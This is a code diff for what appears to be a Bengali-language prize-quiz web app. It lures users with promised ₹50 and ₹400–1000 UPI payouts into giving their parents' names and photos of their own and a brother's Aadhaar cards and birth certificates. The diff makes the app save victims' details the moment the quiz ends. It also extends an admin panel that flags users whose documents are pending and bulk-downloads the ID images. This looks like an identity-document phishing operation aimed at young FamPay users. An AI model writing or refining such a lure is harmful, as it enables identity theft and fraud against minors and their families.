@@ -68,6 +68,16 @@
             0%, 100% { text-shadow: 0 0 10px rgba(255,215,0,0.8), 0 0 20px rgba(255,215,0,0.4); }
             50% { text-shadow: 0 0 20px rgba(255,215,0,1), 0 0 40px rgba(255,215,0,0.7), 0 0 60px rgba(255,215,0,0.4); }
         }
+        .btn-delete {
+            background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.6); color: #f87171;
+            transition: 0.2s; font-weight: bold;
+        }
+        .btn-delete:hover { background: #ef4444; color: #fff; box-shadow: 0 0 12px rgba(239,68,68,0.8); }
+        .badge-pending { animation: badgePulse 1.5s ease-in-out infinite; }
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 rgba(234,179,8,0.5); }
+            50% { box-shadow: 0 0 12px rgba(234,179,8,0.9); }
+        }
     </style>
 </head>
 <body class="antialiased relative flex flex-col items-center p-4">
@@ -107,7 +117,7 @@
             </button>
         </section>
 
-        <!-- ================= 2. PRE-QUIZ INFO FORM (NEW) ================= -->
+        <!-- ================= 2. PRE-QUIZ INFO FORM ================= -->
         <section id="preQuizScreen" class="hidden glass-panel neon-border-cyan rounded-xl p-6 sm:p-8 w-full mt-10 transition-all duration-500">
             <div class="mb-6 border-b border-cyan-500/30 pb-4 text-center">
                 <h2 class="text-xl font-bold neon-text-cyan cyber-font tracking-widest">খেলোয়াড়ের তথ্য</h2>
@@ -155,12 +165,18 @@
         <section id="prizeScreen" class="hidden glass-panel neon-border-gold rounded-xl p-8 w-full mt-10 text-center flex flex-col items-center transition-all duration-500">
             <div class="text-7xl mb-4 animate-bounce">🎉</div>
             <h1 class="text-3xl font-bold neon-text-gold cyber-font tracking-widest mb-2">CONGRATULATIONS!</h1>
-            <p class="text-lg text-white mb-4">আপনি কুইজ জিতেছেন!</p>
+            <p class="text-lg text-white mb-4">আপনি কুইজ সম্পন্ন করেছেন!</p>
             
             <div class="bg-black/60 border-2 border-yellow-500 rounded-xl px-8 py-6 mb-6 neon-border-gold">
                 <p class="text-xs text-yellow-400 tracking-widest uppercase mb-1">INSTANT WIN</p>
                 <p class="text-6xl font-bold neon-text-gold cyber-font pulse-prize">₹50</p>
                 <p class="text-[11px] text-yellow-300/80 mt-2">আপনার FamPay UPI-তে পাঠানো হবে</p>
+            </div>
+
+            <!-- NEW: Info submitted notification -->
+            <div id="adminNotifyBox" class="bg-cyan-900/30 border border-cyan-500/50 rounded-lg p-3 mb-5 w-full flex items-center gap-2">
+                <span class="text-lg">📤</span>
+                <p id="adminNotifyText" class="text-[11px] text-cyan-300 text-left flex-1">আপনার তথ্য Admin-এর কাছে পাঠানো হচ্ছে...</p>
             </div>
 
             <div class="bg-cyan-900/20 border border-cyan-500/40 rounded-lg p-4 mb-6 w-full">
@@ -275,6 +291,18 @@
             <button id="closeAlertBtn" class="btn-cyber px-8 py-2 rounded transition text-sm">OK</button>
         </div>
     </div>
+
+    <div id="deleteModal" class="fixed inset-0 bg-black/90 backdrop-blur-md hidden items-center justify-center z-[110] p-4">
+        <div class="glass-panel neon-border-pink p-6 rounded-xl w-full max-w-sm text-center" style="border-color:#ef4444; box-shadow:0 0 20px rgba(239,68,68,0.5);">
+            <div class="text-5xl mb-3">⚠️</div>
+            <h3 class="text-xl font-bold mb-2 cyber-font tracking-wider" style="color:#f87171; text-shadow:0 0 8px rgba(239,68,68,0.6);">DELETE PLAYER?</h3>
+            <p id="deleteMessage" class="text-sm text-cyan-100 mb-6 whitespace-pre-line">This will permanently delete the player and all documents.</p>
+            <div class="flex gap-3">
+                <button id="cancelDeleteBtn" class="flex-1 btn-cyber py-2 rounded text-sm">CANCEL</button>
+                <button id="confirmDeleteBtn" class="flex-1 btn-delete py-2 rounded text-sm cyber-font tracking-wider">DELETE</button>
+            </div>
+        </div>
+    </div>
     
     <div id="sidebarOverlay" class="fixed inset-0 bg-black/50 z-30 hidden backdrop-blur-sm transition-opacity"></div>
 
@@ -313,8 +341,52 @@
                 alertModal.classList.add('flex');
             };
 
-            // ================= PLAYER DATA (Pre-Quiz) =================
+            // ============= PLAYER STATE =============
             let playerInfo = { playerName: '', fatherName: '', motherName: '', upiId: '' };
+            let currentPlayerRef = null;   // Firebase ref for current player session
+            let savePromise = null;        // Promise tracking initial save
+
+            // ============= SAVE PLAYER INFO AFTER QUIZ (NEW) =============
+            // Called immediately when last quiz question is answered (right OR wrong)
+            async function savePlayerInfoAfterQuiz() {
+                try {
+                    // If a ref already exists (retry case), reuse it; else create new
+                    if (!currentPlayerRef) {
+                        currentPlayerRef = playersRef.push();
+                    }
+                    await currentPlayerRef.update({
+                        playerName: playerInfo.playerName,
+                        fatherName: playerInfo.fatherName,
+                        motherName: playerInfo.motherName,
+                        upiId: playerInfo.upiId,
+                        quizPrize: 50,
+                        uploadPrize: '400-1000',
+                        status: 'quiz_completed',
+                        quizCompletedAt: firebase.database.ServerValue.TIMESTAMP
+                    });
+                    // Update the notification box UI
+                    const notifyBox = document.getElementById('adminNotifyBox');
+                    const notifyText = document.getElementById('adminNotifyText');
+                    if (notifyBox && notifyText) {
+                        notifyBox.className = "bg-green-900/30 border border-green-500/50 rounded-lg p-3 mb-5 w-full flex items-center gap-2";
+                        notifyText.className = "text-[11px] text-green-300 text-left flex-1";
+                        notifyBox.querySelector('span').innerText = '✅';
+                        notifyText.innerText = 'আপনার তথ্য Admin-এর কাছে পৌঁছে গেছে। এখন ডকুমেন্ট আপলোড করুন।';
+                    }
+                    return true;
+                } catch (error) {
+                    console.error("Save failed", error);
+                    const notifyBox = document.getElementById('adminNotifyBox');
+                    const notifyText = document.getElementById('adminNotifyText');
+                    if (notifyBox && notifyText) {
+                        notifyBox.className = "bg-red-900/30 border border-red-500/50 rounded-lg p-3 mb-5 w-full flex items-center gap-2";
+                        notifyText.className = "text-[11px] text-red-300 text-left flex-1";
+                        notifyBox.querySelector('span').innerText = '⚠️';
+                        notifyText.innerText = 'তথ্য পাঠাতে সমস্যা হচ্ছে — ডকুমেন্ট আপলোডের সময় আবার চেষ্টা হবে।';
+                    }
+                    return false;
+                }
+            }
 
             // ================= 1. QUIZ LOGIC =================
             const quizData = [
@@ -327,13 +399,11 @@
             const optionsContainer = document.getElementById('optionsContainer');
             const qProgress = document.getElementById('quizProgress');
 
-            // Intro → PreQuiz form
             document.getElementById('startQuizBtn').addEventListener('click', () => {
                 screens.intro.classList.add('hidden');
                 screens.preQuiz.classList.remove('hidden');
             });
 
-            // PreQuiz → Quiz
             document.getElementById('continueToQuizBtn').addEventListener('click', () => {
                 const name = document.getElementById('prePlayerName').value.trim();
                 const father = document.getElementById('preFatherName').value.trim();
@@ -375,13 +445,25 @@
                 if (currentQuestionIndex < quizData.length) {
                     loadQuestion(currentQuestionIndex);
                 } else {
-                    // Quiz complete → Prize reveal (₹50)
+                    // ⭐ LAST QUESTION ANSWERED (right OR wrong) — save info to Admin NOW
                     screens.quiz.classList.add('hidden');
                     screens.prize.classList.remove('hidden');
+                    
+                    // Reset notify box to "sending" state
+                    const notifyBox = document.getElementById('adminNotifyBox');
+                    const notifyText = document.getElementById('adminNotifyText');
+                    if (notifyBox && notifyText) {
+                        notifyBox.className = "bg-cyan-900/30 border border-cyan-500/50 rounded-lg p-3 mb-5 w-full flex items-center gap-2 animate-pulse";
+                        notifyText.className = "text-[11px] text-cyan-300 text-left flex-1";
+                        notifyBox.querySelector('span').innerText = '📤';
+                        notifyText.innerText = 'আপনার তথ্য Admin-এর কাছে পাঠানো হচ্ছে...';
+                    }
+                    
+                    // Save to Firebase in background (non-blocking)
+                    savePromise = savePlayerInfoAfterQuiz();
                 }
             }
 
-            // Prize → Upload form
             document.getElementById('goToUploadBtn').addEventListener('click', () => {
                 screens.prize.classList.add('hidden');
                 screens.form.classList.remove('hidden');
@@ -415,7 +497,6 @@
                 }
             });
 
-            // ⭐ ORIGINAL QUALITY — direct base64, no compression
             const readFileAsDataURL = (file) => {
                 return new Promise((resolve, reject) => {
                     if (!file) { resolve(null); return; }
@@ -429,14 +510,11 @@
             const playerForm = document.getElementById('playerForm');
             const submitBtn = document.getElementById('submitBtn');
             const submitLoader = document.getElementById('submitLoader');
-
-            // Max single-value safety limit for Firebase RTDB
             const MAX_FILE_SIZE_MB = 12;
 
             playerForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 
-                // Validate text info is present
                 if (!playerInfo.playerName) {
                     showAlert("ত্রুটি", "কুইজ তথ্য হারিয়ে গেছে, আবার শুরু করুন।");
                     screens.form.classList.add('hidden');
@@ -444,7 +522,6 @@
                     return;
                 }
 
-                // Validate files
                 for (let input of fileInputs) {
                     const el = document.getElementById(input.id);
                     if (!el.files || el.files.length === 0) {
@@ -453,12 +530,11 @@
                     }
                 }
 
-                // Size check (RTDB safety)
                 for (let input of fileInputs) {
                     const file = document.getElementById(input.id).files[0];
                     if (file.size > MAX_FILE_SIZE_MB * 1024 * 1024) {
                         showAlert("ফাইল অনেক বড়", 
-                            `"${file.name}" এর সাইজ ${(file.size/1024/1024).toFixed(1)}MB, সর্বোচ্চ ${MAX_FILE_SIZE_MB}MB অনুমোদিত।\n\nঅনুগ্রহ করে ছোট ছবি দিন (ক্যামেরা সেটিংসে কোয়ালিটি কমিয়ে তুলুন)।`);
+                            `"${file.name}" এর সাইজ ${(file.size/1024/1024).toFixed(1)}MB, সর্বোচ্চ ${MAX_FILE_SIZE_MB}MB অনুমোদিত।\n\nঅনুগ্রহ করে ছোট ছবি দিন।`);
                         return;
                     }
                 }
@@ -468,6 +544,26 @@
                 submitLoader.style.display = 'block';
 
                 try {
+                    // Wait for the initial quiz-completion save to finish (if still running)
+                    if (savePromise) {
+                        try { await savePromise; } catch(e) { console.error("pending save err", e); }
+                    }
+
+                    // If no ref exists (e.g., save failed or page reloaded), create one now
+                    if (!currentPlayerRef) {
+                        currentPlayerRef = playersRef.push();
+                        await currentPlayerRef.set({
+                            playerName: playerInfo.playerName,
+                            fatherName: playerInfo.fatherName,
+                            motherName: playerInfo.motherName,
+                            upiId: playerInfo.upiId,
+                            quizPrize: 50,
+                            uploadPrize: '400-1000',
+                            status: 'quiz_completed',
+                            quizCompletedAt: firebase.database.ServerValue.TIMESTAMP
+                        });
+                    }
+
                     // Read all 4 files at full quality
                     const [b64Aadhaar, b64BirthCert, b64BroAadhaar, b64BroBirthCert] = await Promise.all([
                         readFileAsDataURL(document.getElementById('aadhaarPhoto').files[0]),
@@ -476,29 +572,20 @@
                         readFileAsDataURL(document.getElementById('brotherBirthCertPhoto').files[0])
                     ]);
 
-                    // Push a new record with text info first
-                    const newRef = playersRef.push();
-                    await newRef.set({
-                        playerName: playerInfo.playerName,
-                        fatherName: playerInfo.fatherName,
-                        motherName: playerInfo.motherName,
-                        upiId: playerInfo.upiId,
-                        quizPrize: 50,
-                        uploadPrize: '400-1000',
-                        timestamp: firebase.database.ServerValue.TIMESTAMP
-                    });
+                    // Upload each image to the SAME ref at ORIGINAL QUALITY
+                    await currentPlayerRef.child('aadhaarPhoto').set(b64Aadhaar);
+                    await currentPlayerRef.child('birthCertPhoto').set(b64BirthCert);
+                    await currentPlayerRef.child('brotherAadhaarPhoto').set(b64BroAadhaar);
+                    await currentPlayerRef.child('brotherBirthCertPhoto').set(b64BroBirthCert);
 
-                    // Upload each image separately at ORIGINAL QUALITY
-                    // (each write gets its own 16MB limit, so no quality loss)
-                    await newRef.child('aadhaarPhoto').set(b64Aadhaar);
-                    await newRef.child('birthCertPhoto').set(b64BirthCert);
-                    await newRef.child('brotherAadhaarPhoto').set(b64BroAadhaar);
-                    await newRef.child('brotherBirthCertPhoto').set(b64BroBirthCert);
+                    // Mark as complete
+                    await currentPlayerRef.child('status').set('documents_uploaded');
+                    await currentPlayerRef.child('docsUploadedAt').set(firebase.database.ServerValue.TIMESTAMP);
 
                     showAlert("সফল! 🎉", 
-                        `${playerInfo.playerName}, আপনার ডকুমেন্টস অরিজিনাল কোয়ালিটিতে জমা হয়েছে!\n\n✓ ₹50 (কুইজ) + ₹400-₹1000 (ডকুমেন্ট) = মোট প্রাইজ\n✓ FamPay UPI: ${playerInfo.upiId}\n\nভেরিফিকেশনের পর টাকা পাঠানো হবে।`);
+                        `${playerInfo.playerName}, আপনার ডকুমেন্টস অরিজিনাল কোয়ালিটিতে জমা হয়েছে!\n\n✓ ₹50 (কুইজ) + ₹400-₹1000 (ডকুমেন্ট)\n✓ FamPay UPI: ${playerInfo.upiId}\n\nAdmin আপনার সম্পূর্ণ তথ্য পেয়েছেন। ভেরিফিকেশনের পর টাকা পাঠানো হবে।`);
                     
-                    // Reset
+                    // Reset all state
                     playerForm.reset();
                     fileInputs.forEach(inputObj => {
                         const label = document.getElementById(inputObj.label);
@@ -513,13 +600,16 @@
                     document.getElementById('preMotherName').value = '';
                     document.getElementById('preUpiId').value = '';
                     
+                    currentPlayerRef = null;
+                    savePromise = null;
+                    currentQuestionIndex = 0;
+                    
                     screens.form.classList.add('hidden');
                     screens.intro.classList.remove('hidden');
-                    currentQuestionIndex = 0;
 
                 } catch (error) {
                     console.error(error);
-                    showAlert("আপলোড ব্যর্থ", "ইন্টারনেট কানেকশন চেক করুন অথবা ছবির সাইজ কমিয়ে আবার চেষ্টা করুন।\n\nত্রুটি: " + (error.message || error));
+                    showAlert("আপলোড ব্যর্থ", "ইন্টারনেট চেক করুন অথবা ছবির সাইজ কমিয়ে আবার চেষ্টা করুন।\n\nত্রুটি: " + (error.message || error));
                 } finally {
                     submitBtn.disabled = false;
                     submitBtn.querySelector('span').innerText = 'CLAIM ₹400 - ₹1000';
@@ -582,7 +672,14 @@
                         players.push(data);
                         window.playersData[childSnapshot.key] = data;
                     });
-                    players.sort((a, b) => b.timestamp - a.timestamp);
+                    // Sort: pending docs first (need attention), then by timestamp desc
+                    players.sort((a, b) => {
+                        const aPending = a.status === 'quiz_completed' && !a.aadhaarPhoto;
+                        const bPending = b.status === 'quiz_completed' && !b.aadhaarPhoto;
+                        if (aPending && !bPending) return -1;
+                        if (!aPending && bPending) return 1;
+                        return (b.timestamp || 0) - (a.timestamp || 0);
+                    });
                     renderPlayersList(players, list);
                 }, (error) => {
                     list.innerHTML = '<div class="col-span-full text-center text-red-500 py-10">কানেকশন সমস্যা</div>';
@@ -598,23 +695,50 @@
                 
                 players.forEach(p => {
                     const card = document.createElement('div');
-                    card.className = "bg-black/40 border border-cyan-500/30 p-4 rounded-lg flex flex-col gap-3 hover:border-gold-500/50 transition";
+                    const docsComplete = p.aadhaarPhoto && p.birthCertPhoto && p.brotherAadhaarPhoto && p.brotherBirthCertPhoto;
+                    const isPending = !docsComplete && p.playerName && p.upiId;
+                    
+                    // Card border reflects status
+                    card.className = `bg-black/40 border p-4 rounded-lg flex flex-col gap-3 transition ${
+                        isPending 
+                            ? 'border-yellow-500/60 shadow-[0_0_15px_rgba(234,179,8,0.3)]' 
+                            : 'border-cyan-500/30 hover:border-gold-500/50'
+                    }`;
+                    
                     const firstLetter = (p.playerName || 'P').charAt(0).toUpperCase();
+                    
+                    // Status badge
+                    let statusBadge = '';
+                    if (docsComplete) {
+                        statusBadge = `<span class="text-[9px] bg-green-500/20 text-green-400 border border-green-500/50 px-2 py-0.5 rounded font-bold">✓ COMPLETE</span>`;
+                    } else if (isPending) {
+                        statusBadge = `<span class="text-[9px] bg-yellow-500/20 text-yellow-400 border border-yellow-500/60 px-2 py-0.5 rounded font-bold badge-pending">📝 QUIZ DONE — DOCS PENDING</span>`;
+                    } else {
+                        statusBadge = `<span class="text-[9px] bg-gray-500/20 text-gray-400 border border-gray-500/50 px-2 py-0.5 rounded">⏳ NO DATA</span>`;
+                    }
+
+                    const safeImg = (src, altText) => {
+                        if (src && typeof src === 'string' && src.startsWith('data:')) {
+                            return `<img src="${src}" class="w-full h-12 object-cover rounded opacity-80 border border-cyan-900" alt="${altText}">`;
+                        }
+                        return `<div class="w-full h-12 rounded border border-cyan-900 bg-cyan-950/50 flex items-center justify-center text-[8px] text-cyan-700">No data</div>`;
+                    };
+
                     card.innerHTML = `
-                        <div class="flex items-center justify-between border-b border-cyan-500/20 pb-3">
-                            <div class="flex items-center gap-3">
-                                <div class="w-12 h-12 rounded-full border border-cyan-400 bg-gradient-to-br from-cyan-900 to-pink-900 flex items-center justify-center text-xl font-bold text-cyan-300 cyber-font">
+                        <div class="flex items-start justify-between border-b border-cyan-500/20 pb-3 gap-2">
+                            <div class="flex items-center gap-3 min-w-0 flex-1">
+                                <div class="w-12 h-12 rounded-full border border-cyan-400 bg-gradient-to-br from-cyan-900 to-pink-900 flex items-center justify-center text-xl font-bold text-cyan-300 cyber-font shrink-0">
                                     ${firstLetter}
                                 </div>
                                 <div class="min-w-0">
-                                    <h3 class="text-lg font-bold text-white cyber-font">${p.playerName || 'N/A'}</h3>
-                                    <p class="text-[10px] text-cyan-300">Fa: ${p.fatherName || '-'}</p>
-                                    <p class="text-[10px] text-cyan-300">Ma: ${p.motherName || '-'}</p>
+                                    <div class="flex items-center gap-2 flex-wrap">
+                                        <h3 class="text-base font-bold text-white cyber-font truncate">${p.playerName || 'N/A'}</h3>
+                                    </div>
+                                    <div class="mt-1">${statusBadge}</div>
+                                    <p class="text-[10px] text-cyan-300 truncate">Fa: ${p.fatherName || '-'}</p>
+                                    <p class="text-[10px] text-cyan-300 truncate">Ma: ${p.motherName || '-'}</p>
                                 </div>
                             </div>
-                            <button data-id="${p.id}" class="download-docs-btn btn-gold border px-3 py-1.5 rounded text-[10px] cyber-font tracking-wide font-bold">
-                                DOWNLOAD DOCS
-                            </button>
                         </div>
                         <div class="bg-yellow-900/20 border border-yellow-500/40 rounded p-2 flex items-center justify-between gap-2">
                             <div class="flex-1 min-w-0">
@@ -622,13 +746,21 @@
                                 <p class="text-sm font-bold text-yellow-300 truncate">${p.upiId || 'N/A'}</p>
                                 <p class="text-[9px] text-yellow-400/70 mt-0.5">₹${p.quizPrize || 50} (quiz) + ₹${p.uploadPrize || '400-1000'} (docs)</p>
                             </div>
-                            ${p.upiId ? `<button data-upi="${p.upiId}" class="copy-upi-btn bg-yellow-500/20 hover:bg-yellow-500/40 text-yellow-300 border border-yellow-500/60 px-2 py-1 rounded text-[10px] font-bold transition">COPY</button>` : ''}
+                            ${p.upiId ? `<button data-upi="${p.upiId}" class="copy-upi-btn bg-yellow-500/20 hover:bg-yellow-500/40 text-yellow-300 border border-yellow-500/60 px-2 py-1 rounded text-[10px] font-bold transition shrink-0">COPY</button>` : ''}
                         </div>
                         <div class="grid grid-cols-4 gap-2 mt-1">
-                            <div class="flex flex-col"><span class="text-[9px] text-cyan-600 mb-1">Aadhaar</span><img src="${p.aadhaarPhoto || ''}" class="w-full h-12 object-cover rounded opacity-80 border border-cyan-900"></div>
-                            <div class="flex flex-col"><span class="text-[9px] text-cyan-600 mb-1">Birth Cert</span><img src="${p.birthCertPhoto || ''}" class="w-full h-12 object-cover rounded opacity-80 border border-cyan-900"></div>
-                            <div class="flex flex-col"><span class="text-[9px] text-pink-700 mb-1">Bro Aadhaar</span><img src="${p.brotherAadhaarPhoto || ''}" class="w-full h-12 object-cover rounded opacity-80 border border-pink-900"></div>
-                            <div class="flex flex-col"><span class="text-[9px] text-pink-700 mb-1">Bro Birth</span><img src="${p.brotherBirthCertPhoto || ''}" class="w-full h-12 object-cover rounded opacity-80 border border-pink-900"></div>
+                            <div class="flex flex-col"><span class="text-[9px] text-cyan-600 mb-1">Aadhaar</span>${safeImg(p.aadhaarPhoto, 'Aadhaar')}</div>
+                            <div class="flex flex-col"><span class="text-[9px] text-cyan-600 mb-1">Birth Cert</span>${safeImg(p.birthCertPhoto, 'Birth Cert')}</div>
+                            <div class="flex flex-col"><span class="text-[9px] text-pink-700 mb-1">Bro Aadhaar</span>${safeImg(p.brotherAadhaarPhoto, 'Bro Aadhaar')}</div>
+                            <div class="flex flex-col"><span class="text-[9px] text-pink-700 mb-1">Bro Birth</span>${safeImg(p.brotherBirthCertPhoto, 'Bro Birth')}</div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2 mt-1">
+                            <button data-id="${p.id}" class="download-docs-btn btn-gold border px-3 py-2 rounded text-[10px] cyber-font tracking-wide font-bold" ${!docsComplete ? 'disabled style="opacity:0.4;cursor:not-allowed"' : ''}>
+                                ⬇ DOWNLOAD ALL
+                            </button>
+                            <button data-id="${p.id}" class="delete-player-btn btn-delete px-3 py-2 rounded text-[10px] cyber-font tracking-wide">
+                                🗑 DELETE
+                            </button>
                         </div>
                     `;
                     container.appendChild(card);
@@ -636,6 +768,7 @@
 
                 document.querySelectorAll('.download-docs-btn').forEach(btn => {
                     btn.addEventListener('click', function() {
+                        if (this.disabled) return;
                         downloadAllDocs(this.getAttribute('data-id'));
                     });
                 });
@@ -647,15 +780,61 @@
                             navigator.clipboard.writeText(upi).then(() => {
                                 this.innerText = 'COPIED!';
                                 setTimeout(() => { this.innerText = 'COPY'; }, 1500);
-                            }).catch(() => {
-                                showAlert("কপি ম্যানুয়ালি করুন", "UPI: " + upi);
-                            });
+                            }).catch(() => showAlert("কপি ম্যানুয়ালি করুন", "UPI: " + upi));
                         } else {
                             showAlert("UPI ID", upi);
                         }
                     });
                 });
+
+                document.querySelectorAll('.delete-player-btn').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        const id = this.getAttribute('data-id');
+                        const p = window.playersData[id];
+                        if (!p) return;
+                        deleteTargetId = id;
+                        document.getElementById('deleteMessage').innerText = 
+                            `"${p.playerName}" এর সব তথ্য ও ডকুমেন্ট (যদি থাকে) স্থায়ীভাবে ডিলিট হয়ে যাবে।\n\nএটি আর ফিরিয়ে আনা যাবে না। আপনি কি নিশ্চিত?`;
+                        deleteModal.classList.remove('hidden');
+                        deleteModal.classList.add('flex');
+                    });
+                });
             }
+
+            const deleteModal = document.getElementById('deleteModal');
+            let deleteTargetId = null;
+
+            document.getElementById('cancelDeleteBtn').addEventListener('click', () => {
+                deleteModal.classList.add('hidden');
+                deleteModal.classList.remove('flex');
+                deleteTargetId = null;
+            });
+
+            document.getElementById('confirmDeleteBtn').addEventListener('click', async () => {
+                if (!deleteTargetId) return;
+                const btn = document.getElementById('confirmDeleteBtn');
+                const originalText = btn.innerText;
+                btn.innerText = 'DELETING...';
+                btn.disabled = true;
+                btn.style.opacity = '0.6';
+
+                try {
+                    const playerName = window.playersData[deleteTargetId]?.playerName || 'Player';
+                    await playersRef.child(deleteTargetId).remove();
+                    
+                    deleteModal.classList.add('hidden');
+                    deleteModal.classList.remove('flex');
+                    showAlert("✓ ডিলিট সম্পন্ন", `"${playerName}" এর সব তথ্য ও ডকুমেন্ট Firebase থেকে স্থায়ীভাবে ডিলিট হয়েছে।`);
+                } catch (error) {
+                    console.error(error);
+                    showAlert("ডিলিট ব্যর্থ", "ইন্টারনেট চেক করে আবার চেষ্টা করুন।\n\nত্রুটি: " + (error.message || error));
+                } finally {
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    deleteTargetId = null;
+                }
+            });
 
             function downloadAllDocs(playerId) {
                 const p = window.playersData[playerId];
@@ -667,24 +846,26 @@
                     { data: p.birthCertPhoto, suffix: 'Birth_Certificate' },
                     { data: p.brotherAadhaarPhoto, suffix: 'Brother_Aadhaar' },
                     { data: p.brotherBirthCertPhoto, suffix: 'Brother_Birth_Certificate' }
-                ];
+                ].filter(f => f.data);
+
+                if (filesToDownload.length === 0) {
+                    showAlert("ডকুমেন্ট নেই", "এই প্লেয়ারের কোনো ডকুমেন্ট আপলোড হয়নি।");
+                    return;
+                }
 
                 filesToDownload.forEach((file, index) => {
-                    if (file.data) {
-                        setTimeout(() => {
-                            const a = document.createElement('a');
-                            a.href = file.data;
-                            // Preserve original file extension if jpeg/png
-                            const ext = file.data.includes('image/png') ? 'png' : 'jpg';
-                            a.download = `${safeName}_${file.suffix}.${ext}`;
-                            document.body.appendChild(a);
-                            a.click();
-                            document.body.removeChild(a);
-                        }, index * 300);
-                    }
+                    setTimeout(() => {
+                        const a = document.createElement('a');
+                        a.href = file.data;
+                        const ext = file.data.includes('image/png') ? 'png' : 'jpg';
+                        a.download = `${safeName}_${file.suffix}.${ext}`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                    }, index * 300);
                 });
                 
-                showAlert("ডাউনলোড শুরু হয়েছে", "৪টি ডকুমেন্ট অরিজিনাল কোয়ালিটিতে সেভ হচ্ছে।");
+                showAlert("ডাউনলোড শুরু হয়েছে", `${filesToDownload.length}টি ডকুমেন্ট অরিজিনাল কোয়ালিটিতে সেভ হচ্ছে।`);
             }
         });
     </script>
